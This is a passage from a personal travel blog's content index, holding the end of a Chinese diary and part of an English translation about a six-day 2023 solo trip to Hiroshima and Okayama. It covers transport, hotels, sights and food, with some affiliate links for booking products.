分鐘)。船身古色古香，一種突然成為航海王的感覺，路程雖短，但是能鳥瞰瀨戶內海及仙醉島、吹吹風，很舒服。上島後沒看見任何路人，島上一片荒涼，原本的鞆の浦海水浴場遊客中心也已經關閉準備拆除、往山上其他海岸的步道也都因落石封閉；只剩路口還有一家風呂飯店還有營業。鞆の浦海水浴場只剩下一大片寧靜的海灘，只有偶爾能聽到一群海鴨子的嬉戲聲。(我也是第一次看到鹹水鴨，不是鹹水雞)大約只停留了 15 分鐘，沒地方可去就等待渡輪回去了；這地方雖然荒涼但還是有販賣機！回程路上近看了遠方的弁天島，一個孤單矗立在海中間的小島及鳥居。鞆之浦回到鞆之浦時間也接近傍晚時分，晃晃悠悠走到港口看常夜燈與日式城鎮風景，路上有需多人及攝影愛好者都已經坐在港口旁的階梯、架好相機，等待日落的到來。鞆之浦有名的滋補養身保命酒，路上有濃濃的藥酒味；因為還要趕路回廣島，所以就趁還沒天黑之前搭乘公車回福山了。回福山後直接跳上往廣島的列車，告別了這座寧靜平和的城市，晚餐依然直接買回飯店路上的「 炭火焼肉 敏 猿猴橋店 」外帶燒肉餐盒。另外多加了兩顆超商的炸牡蠣(1顆100日元而已)。宵夜依然是 Y1000+超商熱食。Day 4 吳市、廣島市區最後巡禮(廣島和平紀念館、廣島城、縮景園)一早先 Checkout 東橫 INN 拖著行李前往晚上要下榻的 廣島 APA 飯店。寄放好行李後，就走回廣島車站搭乘前往吳市(Kure)的列車(約 50 分鐘)，快到吳市的時候從右邊窗戶往外看有一種回到福隆、宜蘭路線火車的感覺，左邊山右邊臨海，風景愜意。出站後可以去觀光案內所，拿吳市的旅遊指南。(覺得設計的很好！)依照指標就能從車站出來的空橋一路走到港口的大和博物館與海上自衛隊吳史料館。走到底的時候先不要急著下空橋，從空橋上能很好的補捉海上自衛隊吳史料館 — 潛水艦艇。 給未來要來吳市、廣島的朋友作行程安排參考，吳市也可以坐船去宮島及回到廣島，本來有想坐船回廣島，但時間沒搭上，這次就先放棄了。大和博物館裡面有一艘能近距離 360 度觀看的大和戰艦、細節幾乎拉滿，還有戰艦、戰爭的歷史、戰鬥機、大砲…等等，戰艦迷與軍事迷不容錯過；另外剛好遇到特戰，展出日本航母設計、發展史，連設計手稿有。海上自衛隊吳史料館離開大和博物館之後往後面走就是海上自衛隊吳史料館，可以免費入內參觀。博物館內部主要展示潛水艇內部生活環境、工作環境、引擎、水雷，還有歷史。最後最特別的是真的能進入潛水艇，參觀真實的機艙、宿舍、船長室、駕駛室及使用潛望鏡看外部環境。吳市商店街逛完博物館也接近中午時分準備覓食，本來想直接吃海軍咖哩，但查了一下評價好像沒什麼特別的，就先走回吳市商店街再做決定。(其實蠻遠的，再反方向，走路大概花了快 30 分鐘)最後選擇吃吳市冷面，類似涼麵＋豚骨叉燒，麵會冰鎮過，味道爽口，麵量偏多，可以點小份的就好。吃飽準備回車站，路上順路也買了「福住炸紅豆蛋糕」味道偏甜偏油，吃起來很普通；另外也順路買了海軍咖啡、咖哩當伴手禮( subarucoffee_store/ ，店員很親切熱情)。一路再走回吳站，搭列車回廣島。回廣島後最後的廣島市區巡禮，廣島車站出來就有三條路線的觀光巴士可供選擇搭乘(包含在 JR Pass 內)，可以依照自己想去的方向選擇。我想先去縮景園(廣島美術館)，所以選擇搭乘紅色楓葉號。縮景園縮景園就在廣島美術館後面，買票的時候也可以買縮景園+廣島美術館套票。縮景園是個很別緻的小庭院，裡面有很多景觀的縮小造景，例如楓葉、小橋流水、竹林、松柏、山丘. . .等等，走一走看看風景挺不錯的。廣島城下一站漫步到廣島城，廣島城已在核爆中消失，目前的廣島城是後來復建的，整體很新，高度也不高，天守閣看不太到什麼風景。平和紀念館、平和紀念公園最後一站再次回到平和紀念公園，旁邊就是 紙鶴塔(高度不高，沒進去) 。剛好遇到下午時香取慎五吾來弔念。排隊買票參觀和平紀念資料館，裡面有非常豐富的核爆過程、歷史，還有資料照片、物件；整體參觀下來非常沈重震撼。公園的另一邊還有祈念館，太沈重就沒進去了。晚間時分下起毛毛細雨，搭配著剛看完慘痛歷史教訓的心情，回到廣島車站。隨手在車站買了些伴手禮與車站的外帶便當就回飯店休息了，今天還要洗衣服呢。APA 真的隨處可見社長，社長咖哩、社長水、社長的書…房間密度也是一如往常的密集，一層 60 幾間。房間內一樣不大、設施齊全、電子設施也很方便(房間內就能看到洗衣房動態、電視能直接 Airplay)。洗衣服的時候遇到大麻煩，大排隊，整棟 1000 多個房間只有 7 台洗衣機，最後抓準時機，洗衣機快結束時下樓排隊，最後在 11 點多才洗好烘好衣服(還沒乾，回房間繼續晾)。弄到這麼晚，今天吃宵夜很合理！還是 Y1000 + 牛奶 + 超商熟食。Day 5 倉敷、岡山一早風光明媚，天氣晴朗；Chekout 飯店、跟廣島說再見，前往倉敷的下塌飯店寄放行李(也能先寄放在岡山，因為去倉敷還是要先到岡山)。倉敷美觀地區、阿智神社第一站先來到阿智神社，地勢較高能鳥瞰整個倉敷地區，沒什麼人很清幽。阿智神社不大但有名的有繪馬亭、如果抽到不好的籤可依照自己的生肖綁在對應的獸首下、還有求良緣的 花纏守 ：花纏守 ，感謝 Angie 提供。美觀地區不大，但很清幽好逛，遊船因為當日傳票已售罄就沒機會體驗了，但在周邊巷弄走走逛逛也很舒服。午餐吃了有名的 三宅商店 咖哩套餐，咖哩濃郁搭配牛蒡絲很好吃。吃完繼續逛，逛累了跑去吃 パーラー果物小町 (特色是店員會穿著大正時代的女僕裝)水果聖代，岡山晴王葡萄＋水果冰淇淋，葡萄甜到發麻。伴手禮可以買 GOHOBI 倉敷特產膠原蛋白岡山水果果凍。岡山後樂園點燈、岡山城伴隨著夕陽搭乘列車回到岡山站，出站直接搭乘路面電車就能到岡山城周遭。第一站先去岡山後樂園，晚上點燈的感覺很是浪漫美麗。 岡山後樂園＋岡山城每年 11 月中下旬會有點燈活動。順路去隔壁的岡山城看夜景，在楓葉加燈光的映照下別有一番風味。晚餐方便解決，就地吃了一風堂拉麵，再一路漫步回岡山站(路上也有點燈，很美)，回倉敷前還有點時間逛了一下激安殿堂(唐吉訶德)，沒什麼伴手禮，還是要去岡山車站或百貨公司才有賣伴手禮…回倉敷已是晚間時分，天氣寒冷，路上的人也都急匆匆地要趕回家，倉敷站後站的 Outlet 也已關門。才發現這家飯店沒有 24 小時櫃檯，還好沒有太晚回來！但這家飯店的房內設施很齊全，微波爐、熱水壺、眼鏡清洗機都有。在日本的最後一晚只簡單吃了超商雞塊＋Y1000 跟多買一瓶白桃草莓牛奶當宵夜，就沈沈睡去。Day 6 岡山、返程一大清早天剛亮，就 Checkout 出門前往岡山。 預計由岡山搭乘機場交通車回機場， 倉敷也有直達岡山機場的交通車但班次較少( 詳細請參考官網 ) ，昨天岡山也還沒逛完，就打算直奔岡山再從岡山回去了。吉備津神社底搭車站後直奔吉備津神社參觀(車程約 30 分鐘)，出車站大約要再走 15 分鐘才會抵達，有個歷史悠久的檜木長廊，及銀杏與歷史建築，很好走走參拜。路上還有另一個在山腳另一邊的吉備津彥神社順路也可以一同參拜，但因為j時間不夠所以這次就跳過了。岡山 AEON回岡山車站後去附近的 AEON 百貨買買伴手禮、逛逛街，吃個午餐天婦羅蕎麥麵，就準備去排機場交通車回岡山機場了。 排交通車的人很多，但不用緊張上不了車，因為會有加開車次保證大家都能到機場。岡山桃太郎機場 (OKJ)機場有點年代、跟熊本機場差不多小，約 13:50 就完成安檢+報到+出境，距離起飛時間 15:25 還有快 2 個小時。機場班次超少，就是只有同個航班的人，大概只花不到 15 分鐘就完成報到＋掛行李，更特別的是岡山機場小到 X 光機是放在機場大廳的，大廳過完 X 光貼上封條，再去報到(如果打開行李會被要求重新過安檢)。掛完行李在航站樓(總共2樓而已)晃了一下，有一個觀景台可以瞭望，還有咖啡廳跟幾家餐廳可以吃東西，等累了買了一顆白桃冰淇淋大幅來吃。安檢也很快，但岡山機場如果穿靴子是要脫下來安檢的，這點比較麻煩。遇到班機延誤，在候機室等啊等，最後 16:24 才起飛(延誤快一小時)。 再見，岡山、再見，廣島。伴手禮開箱插曲繼上次「 2023 九州 10 日自由行獨旅 」後面幾天其實有一種說不出的孤獨感，一是一個人去陌生的地方、二是不會講日文 10 天幾乎沒講話；那種孤獨感依然記憶猶新，所以並沒有很想再去，是因為即將要工作加上剛好有買到超級特價的機票才出發。第一天再換 JR Pass 時剛好卡住、剛好遇到一群同樣卡住的台灣人、剛好跟前面的台灣人輪流試才成功、剛好她也是去廣島、剛好她進站卡住提醒了她、剛好都買到下下班列車、剛好她買自由座、剛好都想先去超商、剛好是同個業界所以很有話題，剛好都是一個人去，於是第一天就組團一起走完相同的行程了。 很多行程、景點跟時間安排都是 Angie 提供的資訊，如果是本來我自己走可能就會亂走或錯過，然後又孤獨的狂走完 6 天。— — —KKday 推廣 🛒 日本 JR PASS|鳥取・松江區域周遊券|eMCO 電子票 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案 日本 JR PASS｜山陽＆山陰地區鐵路周遊券｜eMCO 電子票 (一口氣玩遍山陽山陰地區) 日本 JR PASS|關西&amp;廣島地區鐵路周遊券|eMCO 電子票 折鶴塔門票(廣島縣廣島市) 日本.宮島|紅葉谷公園・參拜大聖院、嚴島神社|人力車體驗 廣島、宮島巴士一日遊 如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝。更多遊記 [遊記] 2025 韓國釜山 8 天 7 夜自由行 [遊記] 2024 山陰廣域地區 島根 出雲 松江 鳥取 姬路 大阪 神戶 7 日獨旅自由行 [遊記] 2024 二訪九州 9 日自由行，經釜山→博多郵輪入境 [遊記] 2023 九州 10 日自由行獨旅 [遊記] 9/11 名古屋一日快閃 [遊記] 2023 東京 5 日自由行 [遊記] 2023 京阪神 8 日自由行有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝： Follow Me on Medium 1K+ Followers 13,331 Total Views Last Statistics Date: 2025-08-15 | 13,298 Views on Medium." }, { "title": "Travel Diary 2023: 6-Day Free Trip to Hiroshima and Okayama", "url": "/posts/travel-diaries/en/travel-diary-2023-6-day-free-trip-to-hiroshima-and-okayama-31b9b3a63abc/", "categories": "Travel Diaries", "tags": "Lifestyle, Japan, Travel, Hiroshima, Okayama", "date": "2024-01-09 21:27:40 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版[Travel Diary] 2023: 6-Day Free Trip to Hiroshima and OkayamaA 6-day trip to Hiroshi...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版[Travel Diary] 2023: 6-Day Free Trip to Hiroshima and OkayamaA 6-day trip to Hiroshima, Okayama, Fukuyama, Kurashiki, and Onomichi in 2023.IntroductionAfter resigning at the end of August, I set off in September for a “10-Day Solo Trip to Kyushu” after nearly three months of rest. I initially planned to return to work in mid-November, and upon starting my new job, I would need to embark on new projects. Since the new company has limited vacation days, I would have to start accumulating annual leave from scratch according to the basic labor laws. Therefore, I considered going on another trip (planning started at the end of October).Update 2024/11/03: Travel Diary: 2024 7-Day Solo Trip to the San’in Region (+Kansai) - Shimane, Tottori, Himeji, OsakaIn 2024, I visited the San’in region, and friends with time to spare might consider combining both the San’yō and San’in regions for a trip!Destination — Hiroshima (Okayama)On my last trip, I had an unexpected little adventure on the way to Nagasaki — I received a souvenir from Mihara City in Hiroshima Prefecture. After visiting the Atomic Bomb Museum and Peace Memorial Park in Nagasaki, I thought it would be nice to check out Hiroshima as well.Many friends also recommended Hiroshima, known for its World Heritage Site — Itsukushima Shrine, oysters, the Seto Inland Sea, Onomichi, and Rabbit Island…Since I was traveling solo and wanted to avoid big cities and places I had already visited, while also hoping for convenient transportation, Hiroshima seemed like a great choice!Dates — 11/13–18I originally planned to start work on 11/20 (which later got pushed to 12/1). After deducting the last day for a buffer, I booked my return for 11/18 (Saturday).For the outbound flight, I initially had plans with a friend on 11/12, so I aimed to depart on 11/13 (Monday). However, since I hadn’t started work yet, my schedule was flexible, and I decided based on when I could find cheaper flights.A Series of Twists and Turns❌ The most intuitive way to get to Hiroshima is through Hiroshima Airport, but the conditions were very unfavorable: Timing: Late arrival (17:20) and early return (09:30); plus, there were no flights on Saturday, so I had to return on Friday (11/17). Location: Required a shuttle bus (about 55 minutes), and after landing, I could only catch the last bus at 21:40 or 22:20, arriving at the station around 22:00 or 23:00, which was quite late. Price: ~=$17,000, too expensive.❌ Fukuoka in and out + Shinkansen was still inconvenient: Timing: Departing at 16:30 and returning at 10:55, also late arrival and early return, but slightly better. Location: Convenient transportation, but it would take about 1.5 hours by Shinkansen to get to Hiroshima. Price: ~=$12,000; if I wanted to return later (20:35), it would be ~=$17,000 or I could take an early flight at 06:50.❌ Later, I found out that I could fly with Tigerair to Okayama: Timing: Departing at 11:10 and returning at 15:25, which was great. Location: Okayama Airport also required a shuttle bus, but the arrival time was early, giving me plenty of time. Price: Including a 20 KG checked bag, the round trip was about ~= $14,000.Since I had just spent money on the “10 Days in Kyushu” trip in September, I was hesitant to go unless I could keep the flight price around $10,000, so I was almost ready to give up on this trip.✅ Tigerair Okayama Winter Travel Event , Departure:On 10/31, while scrolling through Facebook, I happened to see a post in the “Japan Free Travel Discussion Group” about a promotional flight discount from an airline. I saw that Tigerair was offering discounts for tickets purchased between 11/3 10:00 and 11/6 23:59. Luckily, I approached it with a laid-back attitude, thinking if I could snag a deal, I would go; if not, it was fine.On the morning of 11/3, I was fortunate enough to find the best tickets for my desired dates (11/13–18), with the best flight times and prices, so there was no reason not to go! Departing at 11:10 and returning at 15:25, including a round trip with 20KG checked baggage, seat selection, and miscellaneous fees: $7,012KKday Promotions 🛒 [Japan JR PASS Tottori &amp; Matsue Area Pass eMCO Electronic Ticket](https://www.kkday.com/zh-tw/product/153331){:target=”_blank”} [**Japan eSIM Card Daily High-Speed, Total Data, Unlimited Data Plans**](https://www.kkday.com/zh-tw/product/137689-japan-high-speed-daily-unlimited-data-japanese-esim?cid=19365){:target=”_blank”} Japan JR PASS | Sanyo &amp; San’in Area Rail Pass | eMCO Electronic Ticket (Explore the Sanyo and San’in regions in one go) [Japan JR PASS Kansai &amp; Hiroshima Area Rail Pass eMCO Electronic Ticket](https://www.kkday.com/zh-tw/product/20310-jr-west-kansai-hiroshima-area-pass-e-mco-voucher-japan?cid=19365&amp;ud1=31b9b3a63abc){:target=”_blank”} Atomic Bomb Dome Ticket (Hiroshima City, Hiroshima Prefecture) [Japan: Miyajima Momijidani Park, Daishoin Temple, Itsukushima Shrine Rickshaw Experience](https://www.kkday.com/zh-tw/product/22395-miyajima-private-tour-ebisuya-rickshaw-experience?cid=19365&amp;ud1=31b9b3a63abc){:target=”_blank”} Hiroshima and Miyajima One-Day Bus TourPreparationsAfter securing my flight, there was only a week left until departure, so I jumped right into preparations.I planned to visit Miyajima, Onomichi, the Kurashiki Bikan Historical Area, and Okayama Castle; therefore, I decided to base myself in Hiroshima for a longer stay and then move to Okayama closer to my return date.TransportationI purchased the JR Pass for Okayama, Hiroshima, and Yamaguchi Area (¥ 17,000, just in time before the price increase at the end of October 2023).The one-way fare from Okayama to Hiroshima is ¥6,460, and the round trip is ¥12,920; considering trips to Miyajima, Onomichi, and Kure… it should be worth it; buying the JR Pass is the most convenient option.Accommodation (5 Nights)Toyoko Inn Hiroshima Station Baseball Park Front (3 Nights) Price: $4,612, $1,537/night, single non-smoking room Transportation: It looks close on the map (actually about a 15-minute walk due to construction and crossing a level crossing), and it’s not a lively area, located outside the Mazda Zoom-Zoom Stadium, which is quiet since there are no games.Toyoko Inn consistently offers great value for money, making it the best accommodation in terms of price and environment this time.APA Hotel Hiroshima Station Front Ohashi (1 Night) Price: $2,501, 1 night, single non-smoking room Location: Closer to Hiroshima Station, but it’s still a bit of a walk, requiring crossing a major road and a bridge (about 10 minutes); it takes about 15 minutes to walk from the previous accommodation, so it’s somewhat convenient.Since I couldn’t book four nights at Toyoko Inn, I had to stay one night at the APA Hotel.Livemax Okayama Kurashiki Station Front Hotel (1 Night) Price: $3,263, 1 night, single non-smoking room Location: Just outside Kurashiki Station, about a five-minute walk, very convenient.I found Kurashiki because I couldn’t find an acceptable-priced hotel in Okayama, so I had to look for something along the JR line since Kurashiki also has a shuttle back to Okayama Airport; I decided to find a hotel near Kurashiki.This was the only hotel in Kurashiki that still had rooms available, was conveniently located, and had a reasonable price.ItineraryOriginally, my plan was as follows: 11/13: Shopping and trying Hiroshima-style okonomiyaki 11/14: Miyajima and Hiroshima City: Itsukushima Shrine, Momijidani Park, Miyajima Ropeway -&gt; Shishiiwa Observatory, Atomic Bomb Dome, Peace Memorial Park, Atomic Bomb Museum, and the Paper Crane Tower (Hiroshima Tower) 11/15: Onomichi and Senkoji Temple 11/16: Kure City and Hiroshima City (same as 11/14), Hiroshima Castle 11/17: Okayama and Kurashiki: Okayama Korakuen, Okayama Castle, Kibitsu Shrine, Kurashiki Bikan Historical Area, Kurashiki Outlet, and Achi Shrine 11/18: Kurashiki Outlet and return tripRabbit Island is too far and inconvenient, so it’s only on my reference list.Let’s Go! Flight Tracker, iPhone Suica Usage, Visit Japan Pre-Entry Application… I mentioned these in previous articles, so I won’t elaborate here.Day 1: DepartureI took off at 11:10 AM, so I took my time getting ready in the morning.I took the airport MRT from Taipei Main Station to Taoyuan Airport Terminal 1, arriving at the check-in counter around 08:50.There weren’t many people, so I quickly completed check-in and immigration. Terminal 1 doesn’t have much to eat, so I just bought some fried chicken and coffee before heading to the boarding area.While waiting to board, I wasn’t very hungry, so I didn’t eat the food I bought.We took off at 11:07 and arrived at OKJ (Okayama Momotaro Airport) at 14:11. During the flight, I realized that Tigerair doesn’t allow passengers to bring their own food on board (Peach Airlines doesn’t have a specific rule against it), so I had to hold off on eating until after landing.Okayama Airport is super small; I just followed the crowd and went straight through customs without any corners to sneak a snack. Since I had fried chicken, which might have health regulations, I handed the whole package over to customs for disposal.I completed immigration and baggage claim by around 14:40 (super fast). Later, I checked the flight schedule, and there are very few flights at Okayama Airport; there might only be one international flight a day, so there were hardly any people, just those on my flight. Customs and health inspections were quick, too!Once outside, I hopped on the airport shuttle. Because of the limited flight schedule, I had to wait until 16:10 for the scheduled shuttle to Okayama Station; however, there was an additional shuttle that left as soon as it filled up (it would wait for the next bus if full), which was very considerate and saved everyone time!After getting off, I found the escalator leading up to Okayama Station and went to exchange my JR Pass. I located the machine marked with green and labeled “EXPRESS予約、5489 お受取” to redeem my JR Pass ticket.I had previously found an exchange tutorial online that said to select the blue button for “予約したきっぷのお受取り,” but when I tried following the steps, I kept getting a “QR Code Invalid” error when scanning the QR code. Even entering the order number didn’t work.Finally, after several attempts with a group of Taiwanese travelers, we discovered that we needed to use the yellow button on the bottom left labeled “QRコードの読取り” to redeem it. After clicking that, I could scan the QR code directly, and it worked! (I suspect the JR machines have been updated.)The machine dispensed two instruction sheets and one JR Pass (the ticket marked ✔ in the image). After receiving the JR Pass, I could also use it to complete my seat reservations. The JR Pass ticket is used for entering and exiting the stations, while the reservation ticket is just for reference regarding seat and time; it cannot be used for entry and exit.I was really hungry since I hadn’t eaten anything, so I went to a convenience store to grab something to eat before taking the next JR train.I arrived at Hiroshima Station around 16:45.I checked into my hotel to drop off my luggage before heading out to find something to eat. The street was quite deserted without any baseball games, and across the street was the railway, with not many shops around, but luckily there was a large Lawson convenience store nearby.Hiroshima Okonomiyaki, Station Front SquareAfter returning to the station, I went to eat Hiroshima-style okonomiyaki at “Hiroshima Okonomiyaki, Station Front Square,” located on the 6th floor (next to Ekie department store) on the right side as you exit Hiroshima Station. As soon as I got off the elevator, I was struck by how unique it was; the entire floor is filled with okonomiyaki restaurants, allowing you to choose your favorite place to sit.I ordered an okonomiyaki with added mochi (which includes fried noodles) and found the taste to be average. It was filling, with both noodles and mochi inside.On the way back to the hotel, I picked up a late-night snack. It was quite cold in Hiroshima at night, around 4 degrees Celsius.Unpacking the room.When I opened the curtains, I could see the railway outside (there are about 10 lines, so you need to be quick when crossing the tracks). The downside of the room is that you can hear the clattering sound of trains passing by.Allite A1 65W GaN Fast Charger + Allite Liquid Silicone Fast Charging CableFor this trip, I brought the Allite A1 65W GaN Fast Charger + Allite Liquid Silicone Fast Charging Cable combination. Since switching to the iPhone 15, almost all my devices now use a Type-C port. When traveling, I only need to bring a Type-C charging cable to cover everything.The Allite A1 65W GaN Fast Charger supports single-port 65W and dual-port 45W + 18W fast charging. It’s compact and easy to carry, so when I see a charging outlet while out, I can plug in to recharge. Back at the hotel, I can charge my power bank with one port and my phone, watch, iPad, or Switch with the other—convenient and fast.The Allite Liquid Silicone Fast Charging Cable (1.5m) is long enough to use while my power bank is in my bag. The liquid silicone material is different from regular plastic; it’s skin-friendly, easy to bend for storage, and won’t get all crumpled up.This was the best charging companion for my trip.Day 2: Miyajima (Itsukushima Shrine), Momijidani Park, Shishiiwa Observatory, Atomic Bomb Dome, Peace Memorial Park KKday itinerary reference: _[Japan. Miyajima Momijidani Park, Daishoin Temple, Itsukushima Shrine Rickshaw Experience](https://www.kkday.com/zh-tw/product/22395-miyajima-private-tour-ebisuya-rickshaw-experience?cid=19365&amp;ud1=31b9b3a63abc){:target=”blank”} Hiroshima, Miyajima Bus Day TourMiyajimaIn the morning, I took the JR train to Miyajimaguchi Station. After exiting, I walked towards the pier to find the ferry station. The JR Pass includes the ferry ticket to Miyajima, so there’s no need to buy a separate ticket, but you do need to pay an additional Miyajima Visitor Tax (¥100), and there will be staff to guide you in purchasing the visitor tax ticket. You can also take the Hiroshima Electric Railway to Miyajimaguchi, but I remember it takes longer.The ferry takes about 10 minutes to reach Miyajima. It’s very stable and doesn’t have a diesel smell, and as we approach, you can see the iconic floating torii gate from afar!Once on the island, I headed straight towards the floating torii gate. Taking photos along the shore was beautiful and less crowded.There are also many wild deer on the island that can be quite mischievous XD.After passing by Itsukushima Shrine, I headed to the Miyajima Ropeway to go up to Shishiiwa Observatory.You need to take two segments of the ropeway to reach Shishiiwa Observatory. The advantage of taking the ropeway first is that there are almost no crowds (there were many people at the Itsukushima Shrine below). The first segment is a small gondola that holds a maximum of 6 people (it runs frequently and covers a longer distance), while the second segment is a larger gondola (if I remember correctly, it runs every 15 minutes and can accommodate more people, about 20, but the distance is shorter).At the top, you can overlook the entire Seto Inland Sea, feel the breeze, and enjoy the view of the small islands—very relaxing.Itsukushima Shrine is built right by the sea, with very clean water, creating a serene atmosphere. You can also queue to take photos of the floating torii gate from the front.During this season, the low tide occurs at around 3 AM or 5 PM, so I missed the chance to see the shrine and torii gate during low tide.For lunch, I had to try the oysters. The oyster rice and fried oysters at Oyster House were both over 300 yen, delicious and affordable—I’m now an oyster enthusiast!Tickets for the Miyajima Ropeway and Itsukushima Shrine.I bought a small Itsukushima Shrine torii gate to take home; it’s very cute!Atomic Bomb Dome, Peace Memorial ParkIn the afternoon, I returned to Hiroshima city to visit the Atomic Bomb Dome and Peace Memorial Park.In autumn, Hiroshima is adorned with the yellow of ginkgo trees, the red of maple leaves, and some green leaves, complemented by the cool autumn breeze, as I reflect on everything that has happened in Hiroshima. I encountered many Japanese middle school students on outdoor educational trips at the Peace Memorial Park, with teachers explaining the history. It deeply impressed me how much the Japanese people value historical education and heritage.Back to the HotelAs evening approached, I returned to the hotel to rest because I was underdressed for the cold outside.For dinner, I picked up a takeout bento from “Sumibi Yakiniku Toshi Saruhashi” that I passed on the way back to the hotel. What initially caught my eye was the charcoal grills outside the restaurant, which made it feel very warm. After stopping to check the menu, I discovered they offered takeout bento, so I went inside!Another interesting feature of their bento is that it has a self-heating function. When I get back to the hotel and want to eat, I just pull a string, and it starts heating up, releasing steam. It feels like it’s freshly made no matter when I eat it—very thoughtful!For my late-night snack from the convenience store today, I got a hot dog, fried chicken, Strong Zero, and a bottle of Yakult Y1000, which is said to help with sleep. (But after walking all day, I was already quite tired.)Day 3: Onomichi, Senkoji Temple, Fukuyama, TomonouraIn the morning, I took the Shinkansen to Mihara, then transferred to a train to Onomichi Station.I didn’t time it well, so I ended up waiting over 30 minutes to transfer from Mihara to Onomichi.I exited Onomichi Station through the south exit.The weather was nice and the temperature was pleasant, so after leaving Onomichi Station, I headed straight to Senkoji Temple. Walking on the mountain side felt reminiscent of Jiufen, with many stairs and steep slopes. Looking to the other side, you can see the Seto Inland Sea, which offers a nice view.Another option is to take the main road directly to the sign for the Senkoji Temple ropeway, where you can enter and take the ropeway up to the temple.The view from Senkoji Temple is excellent, allowing you to overlook the entire Onomichi city and the distant Onomichi Bridge.I brought home a cute little Jizo statue (you can choose to write a wish and leave it at Senkoji Temple for blessings or take it home as a keepsake):After visiting Senkoji Temple, I headed down to the Cat Alley.Early online articles often introduced Cat Alley in Japan, but my visit this year felt different; Cat Alley is a small path down from Senkoji Temple, and I didn’t see a single wild cat. Most of the cat cafes along the way were closed, which gave me a bit of a lonely feeling. Eventually, I found one cafe still open, “Bouquet d’Album,” where I stopped for a coffee break.The cafe has a nice location, but the path leading up to it felt overgrown and lonely. The cafe had limited seating and menu options, but the owner was very friendly, and the resident cat was quite affectionate, sitting beside me.On my way back down to the main street, I stumbled upon a quiet local shrine.On my way back to Onomichi Station, I took a detour through the shopping street and had lunch at the famous Onomichi ramen—”Onomichi Ramen Shoya.”Onomichi ramen (founded by a Taiwanese person) is quite unique, with a generous amount of pork back fat floating on top, along with bamboo shoots.After a leisurely stroll back to Onomichi Station, I found that it was still quite early, so I spontaneously decided to head to the nearby Fukuyama City. I miscalculated the time and ended up waiting an extra 30 minutes for the train. Friends coming to Onomichi, make sure to manage your time well.FukuyamaFrom Fukuyama Station, you can see Fukuyama Castle. I didn’t go inside but just took a photo from a distance before moving on.Tomo no UraBack at Fukuyama Station, I spotted the bus directions to “Tomo no Ura.” Initially, I thought it would be hard to reach since it’s a seaside town, but I must commend Japan’s tourism and transportation signage; it’s very clear. P.S. I didn’t do much research on Tomo no Ura beforehand; it was a spontaneous decision to explore. My knowledge of Tomo no Ura was limited to it being the filming location for “Ponyo,” Japan’s first modern port city, and a historical site where Sakamoto Ryoma once negotiated—definitely a must-visit for history buffs.Once on the bus, I rode straight to the end stop, which is Tomo no Ura (the journey takes about 40 minutes).SensuijimaI referred to the local tourist map and decided to first check out Sensuijima for its scenery.After getting off the bus, I walked back to the “Fukuyama City Ferry Terminal” to take a ferry to Sensuijima (about a 10-minute ride).The ferry had a vintage charm, giving me a sudden feeling of being a sailor. Although the journey was short, it offered a great view of the Seto Inland Sea and Sensuijima, and the breeze was refreshing.Once on the island, I didn’t see any other visitors; it was quite desolate. The original Tomo no Ura beach visitor center was closed and set for demolition, and the trails to other beaches in the mountains were also closed due to falling rocks. The only place still open was a ryokan at the entrance.The Tomo no Ura beach was left with a vast, tranquil stretch of sand, where I could occasionally hear a group of sea ducks playing. (It was my first time seeing saltwater ducks, not saltwater chicken!)I stayed for about 15 minutes, and with nowhere else to go, I waited for the ferry to return. Despite its desolation, there was still a vending machine! On the way back, I got a closer look at Benten Island, a lonely little island standing in the middle of the sea with a torii gate.Tomo no UraBy the time I returned to Tomo no Ura, it was nearing evening. I wandered down to the harbor to see the lanterns and the traditional Japanese town scenery. Along the way, I noticed many people and photography enthusiasts already sitting on the steps by the harbor, setting up their cameras and waiting for the sunset.Tomo no Ura is famous for its nourishing medicinal sake, and the air was thick with the scent of the medicinal brew. Since I needed to head back to Hiroshima, I took the bus back to Fukuyama before it got dark.Upon returning to Fukuyama, I hopped on the train to Hiroshima, bidding farewell to this peaceful city. For dinner, I picked up a takeout grilled meat bento from “Sumibi Yakiniku Toshin Saruhashi” on the way back to my hotel.I also added two deep-fried oysters from a convenience store (only 100 yen each).For a late-night snack, I had a convenience store hot meal for 1000 yen.Day 4: Final Tour of Kure City and Hiroshima City (Hiroshima Peace Memorial Museum, Hiroshima Castle, Shukkeien)I checked out of the Toyoko Inn early in the morning and dragged my luggage to the APA Hotel in Hiroshima, where I would be staying that night.After dropping off my luggage, I walked back to Hiroshima Station to catch a train to Kure City (about a 50-minute ride). As we approached Kure City, looking out the right window gave me a nostalgic feeling reminiscent of the train routes in Fulong and Yilan, with mountains on the left and the sea on the right—very pleasant scenery.After exiting the station, I went to the tourist information center to grab a travel guide for Kure City (which I thought was well-designed!).Following the signs, I walked across the pedestrian bridge to the Yamato Museum and the Kure Maritime Museum.When I reached the end of the bridge, don’t rush to go down; you can get a great view of the Kure Maritime Museum from the bridge—submarines on display. For those planning a trip to Kure City and Hiroshima, note that you can also take a boat to Miyajima and back to Hiroshima. I initially wanted to take the boat back to Hiroshima, but I missed the timing, so I decided to skip it this time.Yamato MuseumInside, there’s a battleship Yamato that you can view up close in 360 degrees, with details almost fully displayed, along with the history of battleships, wars, fighter planes, cannons, etc. It’s a must-visit for battleship and military enthusiasts. Additionally, I happened to catch a special exhibition on the design and development history of Japanese aircraft carriers, including design sketches.Kure Maritime MuseumAfter leaving the Yamato Museum, I walked to the Kure Maritime Museum, which is free to enter.The museum mainly showcases the living and working environments inside submarines, engines, torpedoes, and historical artifacts.The most special part is that you can actually enter a submarine and explore the real compartments, dormitories, captain’s room, control room, and use the periscope to see the outside environment.Kure City Shopping StreetAfter visiting the museums, it was close to noon, and I was ready to find something to eat. I initially wanted to try the navy curry, but after checking reviews, it didn’t seem particularly special, so I decided to walk back to Kure City Shopping Street to make a decision (it was quite a distance, and walking took about 30 minutes).In the end, I chose to have Kure cold noodles, which are similar to chilled noodles with pork bone chashu. The noodles are chilled and 